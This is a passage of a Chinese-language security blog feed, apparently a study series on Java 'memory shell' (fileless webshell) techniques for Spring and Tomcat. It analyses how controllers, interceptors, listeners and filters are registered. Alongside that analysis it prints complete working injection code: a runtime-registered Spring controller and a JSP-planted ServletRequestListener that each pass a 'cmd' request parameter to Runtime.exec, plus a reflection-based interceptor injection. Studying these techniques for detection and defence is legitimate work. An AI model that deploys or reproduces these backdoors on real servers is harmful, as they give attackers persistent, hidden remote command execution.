        // 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Shell(), method);

    }

    @ResponseBody
    public class Shell{

        public Shell(){}

        public void shell() throws IOException {
            //è·å–request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
        }
    }

}
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1752214131517.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œåœ¨springbootç‰ˆæœ¬å¤§äº2.6.0çš„æ—¶å€™ä¼šå‡ºç°ä¸€ä¸ªæŠ¥é”™å¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥</p>
<p>è§£å†³åŠæ³•å‚è€ƒï¼š<a href="https://yyjccc.github.io/2024/03/12/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">Springå†…å­˜é©¬</a></p>
<h1 id="interceptorå‹å†…å­˜é©¬">Interceptorå‹å†…å­˜é©¬</h1>
<h2 id="ä»€ä¹ˆæ˜¯interceptor">ä»€ä¹ˆæ˜¯Interceptor</h2>
<p>Spring MVC çš„æ‹¦æˆªå™¨ï¼ˆInterceptorï¼‰ä¸ Java Servlet çš„è¿‡æ»¤å™¨ï¼ˆFilterï¼‰ç±»ä¼¼ï¼Œå®ƒä¸»è¦ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚å¹¶åšç›¸åº”çš„å¤„ç†ï¼Œé€šå¸¸åº”ç”¨åœ¨æƒé™éªŒè¯ã€è®°å½•è¯·æ±‚ä¿¡æ¯çš„æ—¥å¿—ã€åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•ç­‰åŠŸèƒ½ä¸Šã€‚åœ¨ Spring MVC æ¡†æ¶ä¸­å®šä¹‰ä¸€ä¸ªæ‹¦æˆªå™¨éœ€è¦å¯¹æ‹¦æˆªå™¨è¿›è¡Œå®šä¹‰å’Œé…ç½®ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ 2 ç§æ–¹å¼ã€‚</p>
<p>é€šè¿‡å®ç° HandlerInterceptor æ¥å£æˆ–ç»§æ‰¿ HandlerInterceptor æ¥å£çš„å®ç°ç±»ï¼ˆä¾‹å¦‚ HandlerInterceptorAdapterï¼‰æ¥å®šä¹‰</p>
<p>é€šè¿‡å®ç° WebRequestInterceptor æ¥å£æˆ–ç»§æ‰¿ WebRequestInterceptor æ¥å£çš„å®ç°ç±»æ¥å®šä¹‰</p>
<h2 id="interceptorç¤ºä¾‹">Interceptorç¤ºä¾‹</h2>
<p>åœ¨springbootä¸‹å†™äº†ï¼š</p>
<p>WebConfig</p>
<pre><code class="language-java">package org.example.spring.Config;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.*;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new org.example.spring.Interceptor.MyInterceptor())
                .addPathPatterns(&quot;/**&quot;)       // æ‹¦æˆªæ‰€æœ‰è·¯å¾„
                .excludePathPatterns(&quot;/login&quot;); // æ’é™¤ç™»å½•è·¯å¾„
    }
}
</code></pre>
<p>TestController</p>
<pre><code class="language-java">package org.example.spring.Controller;

import org.springframework.web.bind.annotation.*;

@RestController
public class TestController {

    @GetMapping(&quot;/hello&quot;)
    public String hello() {
        return &quot;Hello, world!&quot;;
    }

    @GetMapping(&quot;/login&quot;)
    public String login() {
        return &quot;Login page (not intercepted)&quot;;
    }
}
</code></pre>
<p>MyInterceptor</p>
<pre><code class="language-java">package org.example.spring.Interceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.HandlerInterceptor;

public class MyInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        System.out.println(&quot;è¿›å…¥æ‹¦æˆªå™¨ï¼šMyInterceptor -&gt; preHandle&quot;);
        // è¿”å› true ç»§ç»­æ‰§è¡Œï¼Œfalse åˆ™ç»ˆæ­¢è¯·æ±‚é“¾
        return false;
    }
}
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1752214131533.png" alt="" loading="lazy"></figure>
<p>æ•ˆæœå°±è·ŸFilterå·®ä¸å¤šï¼Œå½“è®¿é—®çš„è·¯ç”±ä¸æ˜¯loginï¼Œå°±ä¼šè¿›å…¥æ‹¦æˆªå™¨ å¦‚æœè¿”å›trueå°±ç»§ç»­æ‰§è¡Œï¼Œå¦‚æœè¿”å›ä¸ºfalseå°±ä¸­æ–­è¿™æ¬¡åŸæ¥å¯¹åº”çš„å¤„ç†æ–¹æ³•</p>
<p>æ–­ç‚¹ä¸‹åœ¨ApplicationFilterChain#internalDoFilterï¼Œå¯ä»¥çœ‹åˆ°å’Œæˆ‘ä»¬ä¹‹å‰å­¦çš„Tomcatå¾ˆåƒï¼Œä½†ä¸Tomcatä¸åŒçš„æ˜¯ï¼Œå½“è°ƒç”¨åˆ°HttpServlet#serviceæ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨DispatcherServlet#doDispatchè¿›è¡Œé€»è¾‘å¤„ç†ï¼Œè¿™æ­£æ˜¯Springçš„é€»è¾‘å¤„ç†æ ¸å¿ƒç±»ã€‚</p>
<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1752214131549.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬å°±ç›´æ¥æ¥çœ‹æ ¸å¿ƒç±»</p>
<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1752214131564.png" alt="" loading="lazy"></figure>
<p>è·Ÿè¿›getHandleræ–¹æ³•ï¼š</p>
<p>ä½¿ç”¨å¢å¼ºforè¯­å¥ éå†handlerMappingsæ¥è·å–HandlerMappingç±»å‹çš„å¯¹è±¡</p>
<pre><code class="language-java">protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
    if (this.handlerMappings != null) {
        for(HandlerMapping mapping : this.handlerMappings) {
            HandlerExecutionChain handler = mapping.getHandler(request);
            if (handler != null) {
                return handler;
            }
        }
    }

    return null;
}
</code></pre>
<p>å®é™…ä¸Šè¿˜ä¼šè°ƒç”¨org.springframework.web.servlet.handler.AbstractHandlerMapping ç±»çš„ getHandler æ–¹æ³•</p>
<pre><code class="language-java">public final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
    Object handler = this.getHandlerInternal(request);
    if (handler == null) {
        handler = this.getDefaultHandler();
    }

    if (handler == null) {
        return null;
    } else {
        if (handler instanceof String) {
            String handlerName = (String)handler;
            handler = this.obtainApplicationContext().getBean(handlerName);
        }

        if (!ServletRequestPathUtils.hasCachedPath(request)) {
            this.initLookupPath(request);
        }

        HandlerExecutionChain executionChain = this.getHandlerExecutionChain(handler, request);
        if (this.logger.isTraceEnabled()) {
            this.logger.trace(&quot;Mapped to &quot; + handler);
        } else if (this.logger.isDebugEnabled() &amp;&amp; !DispatcherType.ASYNC.equals(request.getDispatcherType())) {
            this.logger.debug(&quot;Mapped to &quot; + executionChain.getHandler());
        }

        if (this.hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) {
            CorsConfiguration config = this.getCorsConfiguration(handler, request);
            if (this.getCorsConfigurationSource() != null) {
                CorsConfiguration globalConfig = this.getCorsConfigurationSource().getCorsConfiguration(request);
                config = globalConfig != null ? globalConfig.combine(config) : config;
            }

            if (config != null) {
                config.validateAllowCredentials();
            }

            executionChain = this.getCorsHandlerExecutionChain(request, executionChain, config);
        }

        return executionChain;
    }
}
</code></pre>
<p>è·Ÿè¿›getHandlerExecutionChainæ–¹æ³•ï¼š</p>
<p>é€šè¿‡éå†adaptedInterceptors è·å–åˆ°æ‰€æœ‰çš„HandlerInterceptor</p>
<pre><code class="language-java">protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {
    HandlerExecutionChain chain = handler instanceof HandlerExecutionChain ? (HandlerExecutionChain)handler : new HandlerExecutionChain(handler);

    for(HandlerInterceptor interceptor : this.adaptedInterceptors) {
        if (interceptor instanceof MappedInterceptor) {
            MappedInterceptor mappedInterceptor = (MappedInterceptor)interceptor;
            if (mappedInterceptor.matches(request)) {
                chain.addInterceptor(mappedInterceptor.getInterceptor());
            }
        } else {
            chain.addInterceptor(interceptor);
        }
    }

    return chain;
}
</code></pre>
<p>æ‰¾åˆ°äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„interceptor</p>
<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1752214131579.png" alt="" loading="lazy"></figure>
<p>ç„¶ååœ¨é€šè¿‡chain.addInterceptor æŠŠæ‰€æœ‰çš„interceptoræ·»åŠ åˆ°HandlerExecutionChainä¸­ï¼Œç„¶åå°±ç»“æŸäº†ï¼Œå›åˆ°</p>
<p>ä¸€å¼€å§‹çš„DispatcherServlet#doDispatch()ä¸­ï¼Œè°ƒç”¨mappedHandler.applyPreHandleæ–¹æ³•</p>
<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1752214131595.png" alt="" loading="lazy"></figure>
<p>ç„¶åéå†è°ƒç”¨Interceptorä¸­çš„preHandle()æ‹¦æˆªæ–¹æ³•</p>
<h2 id="å®ç°æ€è·¯">å®ç°æ€è·¯</h2>
<p>è·å–ä¸Šä¸‹æ–‡</p>
<p>å®ç°ä¸€ä¸ªæ¶æ„Interceptorç±»</p>
<p>åŠ¨æ€æ³¨å†Œè¿›å†…å­˜</p>
<h3 id="è·å–ä¸Šä¸‹æ–‡-2">è·å–ä¸Šä¸‹æ–‡</h3>
<p>è·å–ä¸Šä¸‹æ–‡å’ŒControlleræ€è·¯æ˜¯ä¸€æ ·çš„</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬é€šè¿‡åˆšåˆšçš„è°ƒè¯•å¯ä»¥çŸ¥é“ï¼ŒInterceptorç±»çš„ä¿¡æ¯æ˜¯å­˜å‚¨åœ¨adaptedInterceptorsä¸­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åå°„è·å–åˆ°è¿™ä¸ªå±æ€§å¹¶ä¸”æŠŠæ¶æ„ç±»æ·»åŠ è¿›å»</p>
<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1752214131612.png" alt="" loading="lazy"></figure>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è·å–ä¸Šä¸‹æ–‡æ¥ è·å–åˆ°è¿™ä¸ªå¯¹è±¡ï¼ˆBeanï¼‰çš„adaptedInterceptorså±æ€§</p>
<h3 id="å®ç°æ¶æ„interceptorç±»">å®ç°æ¶æ„Interceptorç±»</h3>
<p>æˆ‘ä»¬éœ€è¦å®ç°HandlerInterceptorç±»ï¼Œé‡å†™preHandleæ–¹æ³•</p>
<pre><code class="language-java">public class MyInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        Runtime.getRuntime().exec(&quot;calc&quot;);
        // è¿”å› true ç»§ç»­æ‰§è¡Œï¼Œfalse åˆ™ç»ˆæ­¢è¯·æ±‚é“¾
        return false;

    }
}
</code></pre>
<h3 id="åŠ¨æ€æ³¨å…¥">åŠ¨æ€æ³¨å…¥</h3>
<p>adaptedInterceptorså…¶å®æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨addæ–¹æ³•æ·»åŠ æˆ‘ä»¬çš„æ¶æ„ç±»å°±è¡Œï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬</p>
<pre><code class="language-java">å®é™…ä¸Šè·å–åˆ°çš„æ˜¯å®ƒçš„å®ç°ç±»org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping
æ‰€ä»¥æ˜¯ä¸èƒ½ç›´æ¥é€šè¿‡ä»–æ¥åå°„è·å–å­—æ®µ
AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
</code></pre>
<h3 id="poc-2">POC</h3>
<pre><code class="language-java">package org.example.spring.Controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.ArrayList;

@Controller
public class shellInterceptor {
    @RequestMapping(&quot;/shell&quot;)
    public void shell() throws Exception {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
        AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
        System.out.println(handlerMapping.getClass().getName());
        Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
        field.setAccessible(true);
        ArrayList list = (ArrayList) field.get(handlerMapping);
        list.add(new shell_Interceptor());

    }

    public class shell_Interceptor implements HandlerInterceptor {

        @Override
        public boolean preHandle(HttpServletRequest request,
                                 HttpServletResponse response,
                                 Object handler) throws Exception {
            Runtime.getRuntime().exec(&quot;calc&quot;);
            // è¿”å› true ç»§ç»­æ‰§è¡Œï¼Œfalse åˆ™ç»ˆæ­¢è¯·æ±‚é“¾
            return false;


        }
    }
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Tomcatå‹å†…å­˜ğŸ]]></title>
        <id>https://bloyet.github.io/post/tomcat-xing-nei-cun/</id>
        <link href="https://bloyet.github.io/post/tomcat-xing-nei-cun/">
        </link>
        <updated>2025-07-11T05:53:05.000Z</updated>
        <content type="html"><![CDATA[<p>å‚è€ƒæ–‡çŒ®ï¼š</p>
<p><a href="https://yyjccc.github.io/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcatå†…å­˜é©¬</a></p>
<p><a href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p>
<h1 id="tomcatä¸­çš„ä¸‰ç§context">Tomcatä¸­çš„ä¸‰ç§Context</h1>
<p>æ ¹æ®Tomcatçš„ä¸‰å¤§ä»¶servletã€linstenerã€filteræ³¨å…¥å†…å­˜é©¬ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Š</p>
<p>å…ˆå¯¼å…¥ä¾èµ–ï¼š</p>
<pre><code class="language-java">&lt;dependency&gt;
&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
&lt;version&gt;8.5.31&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h2 id="servletcontext">ServletContext</h2>
<p>åœ¨Tomcatæ¶æ„åˆ†æçš„æ—¶å€™ï¼Œä¹Ÿæåˆ°è¿‡è¿™ä¸ªï¼š</p>
<p>Servletè§„èŒƒä¸­è§„å®šäº†ä¸€ä¸ªServletContextæ¥å£ï¼Œå…¶ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­æ‰€æœ‰Servletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ServletContextæ¥å¯¹æŸä¸ªWebåº”ç”¨çš„èµ„æºè¿›è¡Œè®¿é—®å’Œæ“ä½œ</p>
<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1752213966680.png" alt="" loading="lazy"></figure>
<h2 id="applicationcontext">ApplicationContext</h2>
<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1752213966694.png" alt="" loading="lazy"></figure>
<p>ä½¿ç”¨getServletContext()æ–¹æ³•å…¶å®æ˜¯è·å–åˆ°äº†ApplicationContextFacadeç±»ï¼Œä½†æ˜¯å…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯è°ƒç”¨äº†ApplicationContextç±»ä¸­çš„æ–¹æ³•</p>
<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1752213966709.png" alt="" loading="lazy"></figure>
<h2 id="standardcontext">StandardContext</h2>
<p>å®ƒæ˜¯contextå®¹å™¨çš„æ ‡å‡†å®ç°ç±»ï¼ŒåŒ…å«äº†å¯¹å®¹å™¨èµ„æºçš„å„ç§æ“ä½œï¼ŒApplicationContextæœ¬è´¨ä¸Šæ˜¯è°ƒç”¨äº†StandardContext</p>
<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1752213966724.png" alt="" loading="lazy"></figure>
<p>ä¸€å¼ å›¾æ¥æ€»ç»“å…¶ä¸­çš„å…³ç³»ï¼š</p>
<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1752213966740.jpeg" alt="" loading="lazy"></figure>
<h1 id="tomcatå†…å­˜é©¬">Tomcatå†…å­˜é©¬</h1>
<p>Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹ã€‚å¯èƒ½æœ‰äº›æœ‹å‹ä¼šå‘ç°ï¼Œè¿™ä¸æ­£æ˜¯Java Webæ ¸å¿ƒçš„ä¸‰å¤§ç»„ä»¶å˜›ï¼æ²¡é”™ï¼ŒTomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p>
<p>åœ¨è¿™å°±ä¸€æ­¥ä¸€æ­¥çš„æ¥åˆ†æï¼š</p>
<p>å¼•å…¥Tomcatä¾èµ–â€”è¿™ä¸ªæˆ‘åœ¨ä¸€å¼€å§‹å°±å·²ç»å¼•å…¥äº†</p>
<h2 id="listenerå‹">Listenerå‹</h2>
<p>Listeneræ ¹æ®äº‹ä»¶å¯ä»¥åˆ†ä¸º3ä¸­ServletContextListenerï¼ŒHttpSessionListenerï¼ŒServletRequestListener</p>
<p>å¾ˆæ˜æ˜¾ï¼ŒServletRequestListenerç±»å‹çš„æ˜¯æœ€é€‚åˆç”¨æ¥åšå†…å­˜é©¬çš„ï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘<code>ServletRequestListener#requestInitialized()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å†™å…¥æ¶æ„å‘½ä»¤å°±å¯ä»¥è¾¾åˆ°æ”»å‡»æ‰‹æ®µäº†</p>
<p>ä¾‹å­ï¼š</p>
<pre><code class="language-java">package Listener;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import java.io.IOException;

@WebListener
public class Hello_Listener implements ServletRequestListener {


    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            Runtime.getRuntime().exec(&quot;calc&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (NullPointerException n) {
            n.printStackTrace();
        }
    }
}
</code></pre>
<p>è®¿é—®ä»»æ„è·¯ç”±éƒ½ä¼šè§¦å‘å‘½ä»¤</p>
<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1752213966755.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬åˆšåˆšåªæ˜¯æ¼”ç¤ºäº†ä¸€ä¸‹ Listenerä¸­çš„requestInitialized() ä¼šåœ¨æˆ‘ä»¬è®¿é—®è·¯ç”±çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸å¯èƒ½å¯ä»¥ç›´æ¥å»ä¿®æ”¹è¿™ä¸ªæ–¹æ³•ï¼Œé‚£åº”è¯¥æ€ä¹ˆåŠ¨æ€çš„å†™å…¥æ¶æ„çš„listenerå‘¢ï¼Ÿ</p>
<h3 id="listeneræ³¨å†Œè¿‡ç¨‹">Listeneræ³¨å†Œè¿‡ç¨‹</h3>
<p>æ–­ç‚¹å°±æ‰“åœ¨requestInitialized()æ–¹æ³•ä¸Šï¼Œæˆ‘ä»¬çœ‹çœ‹åœ¨è¿™ä¹‹å‰éƒ½è°ƒç”¨äº†ä»€ä¹ˆéšè—å¸§ï¼Œå¼€å§‹å›æº¯å¯»æ‰¾è°ƒç”¨è¿‡ç¨‹</p>
<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1752213966772.png" alt="" loading="lazy"></figure>
<p>å…ˆæ¥çœ‹StandarContext#fireRequestInitEventæ–¹æ³•</p>
<pre><code class="language-java">public boolean fireRequestInitEvent(ServletRequest request) {
Object[] instances = this.getApplicationEventListeners();
if (instances != null &amp;&amp; instances.length &gt; 0) {
    ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);

    for(int i = 0; i &lt; instances.length; ++i) {
        if (instances[i] != null &amp;&amp; instances[i] instanceof ServletRequestListener) {
            ServletRequestListener listener = (ServletRequestListener)instances[i];

            try {
                listener.requestInitialized(event);
            } catch (Throwable var7) {
                Throwable t = var7;
                ExceptionUtils.handleThrowable(t);
                this.getLogger().error(sm.getString(&quot;standardContext.requestListener.requestInit&quot;, new Object[]{instances[i].getClass().getName()}), t);
                request.setAttribute(&quot;javax.servlet.error.exception&quot;, t);
                return false;
            }
        }
    }
}

return true;
}
</code></pre>
<p>å…ˆæ˜¯è°ƒç”¨getApplicationEventListeners()è·å–åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åéå†æ•°ç»„è°ƒç”¨listener.requestInitialized(event);æ–¹æ³•è§¦å‘Litenerï¼Œå…ˆæ­¥å…¥</p>
<p>getApplicationEventListeners()æ–¹æ³•</p>
<pre><code class="language-java">public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}
</code></pre>
<p>å‘ç°ä¿¡æ¯æ˜¯å‚¨å­˜åœ¨applicationEventListenersListä¸­çš„ï¼š</p>
<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1752213966786.png" alt="" loading="lazy"></figure>
<p>è€Œä¸”æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡StandardContext#addApplicationEventListener()æ–¹æ³•æ¥æ·»åŠ Listener</p>
<pre><code class="language-java">public void addApplicationEventListener(Object listener) {
this.applicationEventListenersList.add(listener);
}
</code></pre>
<h3 id="æ³¨å…¥listener">æ³¨å…¥Listener</h3>
<p>åœ¨å¾€ä¸Šçœ‹ä¸€å¸§</p>
<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1752213966801.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1752213966816.png" alt="" loading="lazy"></figure>
<p>å‘ç°åœ¨è¿™æ‰§è¡Œäº†invokeæ–¹æ³• è·å–åˆ°äº†StandardContextçš„å®ä¾‹</p>
<p>ç¬¬äºŒç§æ–¹æ³•è·å–ï¼š</p>
<p>ç”±äºJSPå†…ç½®äº†requestå¯¹è±¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹å¼æ¥è·å–</p>
<pre><code class="language-java">&lt;%
Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
//è¿™é‡Œçš„Requestä¸ºorg.apache.catalina.connector.Request
StandardContext context = (StandardContext) req.getContext();
%&gt;
</code></pre>
<p>ç¬¬ä¸‰ç§ï¼š</p>
<pre><code class="language-java">&lt;%
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
%&gt;
</code></pre>
<p>è¿™é‡Œå°±ç”¨ç¬¬äºŒç§æ¥è¿›è¡Œæ³¨å…¥ï¼š</p>
<p>è¿™é‡Œå…ˆä½¿ç”¨jspæ–‡ä»¶è¿›è¡Œæ³¨å…¥ï¼Œåé¢è¿˜ä¼šè¯´å®æˆ˜æ€ä¹ˆé€šè¿‡ååºåˆ—åŒ–æ¥åŠ è½½</p>
<pre><code class="language-java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
 
&lt;%!
    public class Shell_Listener implements ServletRequestListener {
 
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
           String cmd = request.getParameter(&quot;cmd&quot;);
           if (cmd != null) {
               try {
                   Runtime.getRuntime().exec(cmd);
               } catch (IOException e) {
                   e.printStackTrace();
               } catch (NullPointerException n) {
                   n.printStackTrace();
               }
            }
        }
 
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%&gt;
&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
 
    Shell_Listener shell_Listener = new Shell_Listener();
    context.addApplicationEventListener(shell_Listener);
%&gt;
</code></pre>
<p>å…ˆè®¿é—®ä¸€ä¸‹jspæ–‡ä»¶ è¿™æ ·å°±ä¼šæŠŠæˆ‘ä»¬çš„æ¶æ„Listeneræ³¨å…¥äº†ï¼ˆè®¿é—®è¿™ä¸ªjspæ–‡ä»¶ä¹‹åï¼Œä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œæˆ‘ä»¬å…ˆæ˜¯è·å–åˆ°äº†contextä¸Šä¸‹æ–‡ï¼Œç„¶åæŠŠæˆ‘ä»¬çš„æ¶æ„ç±»æ·»åŠ åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œç„¶ååœ¨è‡ªåŠ¨çš„è°ƒç”¨æˆ‘ä»¬çš„æ¶æ„æ–¹æ³•ï¼‰</p>
<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1752213966833.png" alt="" loading="lazy"></figure>
<h2 id="filterå‹">Filterå‹</h2>
<h3 id="filterè°ƒç”¨åˆ†æ">Filterè°ƒç”¨åˆ†æ</h3>
<p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼šæ³¨æ„çš„æ˜¯ åœ¨æˆ‘ä»¬ç»™doFilteræ–¹æ³•æ‰“ä¸Šæ–­ç‚¹ä¹‹åï¼Œå·²è°ƒè¯•çš„æ¨¡å¼å»è¿è¡ŒæœåŠ¡å™¨ï¼Œè¿˜éœ€è¦å»è®¿é—®ä¸€ä¸‹èµ„æºï¼Œåœ¨è®¿é—®çš„è¿‡ç¨‹ä¸­ä¼šè§¦å‘Filter</p>
<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1752213966847.png" alt="" loading="lazy"></figure>
<p>è¿˜æ˜¯ä¸€æ ·å…ˆçœ‹è°ƒç”¨æ ˆ</p>
<p>ApplicationFilterChain#internalDoFilter</p>
<pre><code class="language-java">private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
    if (this.pos &lt; this.n) {
        ApplicationFilterConfig filterConfig = this.filters[this.pos++];

        try {
            Filter filter = filterConfig.getFilter();
            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {
                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
            }

            if (Globals.IS_SECURITY_ENABLED) {
                ServletRequest req = request;
                ServletResponse res = response;
                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
                Object[] args = new Object[]{req, res, this};
                SecurityUtil.doAsPrivilege(&quot;doFilter&quot;, filter, classType, args, principal);
            } else {
                filter.doFilter(request, response, this);
            }

        } catch (ServletException | RuntimeException | IOException var15) {
            Exception e = var15;
            throw e;
        } catch (Throwable var16) {
            Throwable e = var16;
            e = ExceptionUtils.unwrapInvocationTargetException(e);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
        }
    } else {
        try {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(request);
                lastServicedResponse.set(response);
            }

